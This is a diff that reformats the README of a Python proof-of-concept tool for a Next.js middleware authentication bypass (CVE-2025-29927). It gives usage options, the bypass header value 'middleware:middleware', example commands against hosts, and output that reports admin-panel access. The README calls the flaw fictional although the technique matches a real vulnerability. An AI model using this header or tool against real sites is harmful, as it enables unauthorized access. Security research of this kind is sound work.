@@ -1,116 +1,111 @@
-PoC for Next.js Middleware Bypass (CVE-2025-29927)
+# PoC for Next.js Middleware Bypass (CVE-2025-29927)
 
-⚠️ DisclaimerThis is a proof-of-concept for a fictional vulnerability. Intended for educational and research purposes only. Use responsibly in authorized environments.
+[![Python Version](https://img.shields.io/badge/python-3.7%2B-blue.svg)](https://www.python.org/)
+[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![Status](https://img.shields.io/badge/status-active-brightgreen.svg)]()
 
-🚀 Features
+This is a **proof-of-concept** for a **fictional** Next.js middleware bypass vulnerability (CVE-2025-29927). Use **only** for educational and authorized security research.
 
-Feature
+---
 
-Description
+## 🚀 Features
 
-✨ Color & Verbose
+| Feature             | Description                                                       |
+| ------------------- | ----------------------------------------------------------------- |
+| ✨ Color & Verbose   | Color-coded output; `-v` for detailed debug logs.                 |
+| 📦 OOP Structure    | Class-based design for clarity and maintainability.               |
+| 🌐 Proxy Support    | Route traffic through HTTP(S) proxies via `--proxy`.              |
+| 🍪 Session Handling | Persistent `requests.Session` for cookies & connection reuse.     |
+| 🚦 Redirect Control | No-follow-redirect by default; clearly detects pass vs. fail.     |
+| 🛠 Custom Headers   | Override `User-Agent`, `x-middleware-subrequest`, or add headers. |
 
-Color-coded output; -v for detailed debug logs.
+---
 
-📦 OOP Structure
+## ⚡ Installation
 
-Clean, class-based design for maintainability.
-
-🌐 Proxy Support
-
-Route through HTTP(S) proxies (Burp/ZAP) via --proxy.
-
-🍪 Session Handling
-
-Persistent requests.Session for cookies & connection reuse.
-
-🚦 Redirect Control
-
-No-follow-redirect by default; clearly distinguish pass/fail.
-
-🛠 Custom Headers
-
-Override User-Agent, x-middleware-subrequest, or add arbitrary headers.
-
-🛠 Installation
-
-Clone this repository:
-
+```bash
+# Clone repository
 git clone https://github.com/your-username/nextjs-middleware-poc.git
 cd nextjs-middleware-poc
 
-(Optional) Create & activate a virtual environment:
-
+# (Optional) Create virtual environment
 python3 -m venv .venv
 source .venv/bin/activate
 
-Install dependencies:
-
+# Install dependencies
 pip install -r requirements.txt
+```
 
-Requires Python 3.7+
+> **Requires** Python 3.7+
 
-📋 Usage
+---
 
+## 🎯 Usage
+
+```bash
 python poc.py [options] <host>[:port]
+```
 
-Option
+| Option                      | Description                                                               |
+| --------------------------- | ------------------------------------------------------------------------- |
+| `-p, --path PATH`           | Protected route path (default: `/admin`)                                  |
+| `-s, --scheme {http,https}` | Protocol (default: `http`)                                                |
+| `--header HEADER`           | `x-middleware-subrequest` header value (default: `middleware:middleware`) |
+| `-ua, --user-agent AGENT`   | Custom `User-Agent` (default: `Mozilla/5.0`)                              |
+| `--proxy PROXY`             | HTTP(S) proxy URL (e.g., `http://127.0.0.1:8080`)                         |
+| `-v, --verbose`             | Enable debug output                                                       |
+| `-h, --help`                | Show this help message                                                    |
 
-Description
+---
 
--h, --help
+## 🔍 Examples
 
-Show help message.
+### 1. Basic Test
 
--p PATH, --path PATH
-
-Protected route to request (default: /admin).
-
--s {http,https}, --scheme
-
-Protocol to use (default: http).
-
---header HEADER
-
-Value for x-middleware-subrequest header (default: middleware:middleware).
-
--ua USER_AGENT, --user-agent
-
-Custom User-Agent (default: Mozilla/5.0).
-
---proxy PROXY
-
-HTTP(S) proxy URL (e.g., http://127.0.0.1:8080).
-
--v, --verbose
-
-Enable debug output for each step.
-
-🔍 Examples
-
-1. Basic test
-
+```bash
 python poc.py localhost:3000
+```
 
-2. HTTPS & custom path
+### 2. HTTPS & Custom Path
 
+```bash
 python poc.py example.com -s https -p /dashboard
+```
 
-3. With proxy & verbose
+### 3. Proxy & Verbose
 
+```bash
 python poc.py internal-app:8080 --proxy http://127.0.0.1:8080 -v
+```
 
-✅ Expected Output
+---
 
-Success:
+## ✅ Expected Output
 
+**Success**
+
+```
 [*] Target URL: http://localhost:3000/admin
 [+] SUCCESS: Middleware bypassed — access granted!
 --- Response Snippet ---
 <!DOCTYPE html><html>…<title>Admin Panel</title>…
-------------------------
+```
 
-Failure:
+**Failure**
 
+```
 [*] Target URL: http://localhost:3000/admin
 [-] FAIL: Access denied by middleware (302 Redirect)
+```
+
+---
+
+## 🤝 Contributing
+
+1. Fork this repository
+2. Create a branch: `git checkout -b feature/my-feature`
+3. Commit changes
+4. Run tests & lint: `pytest && ruff .`
+5. Open a Pull Request
+
+---
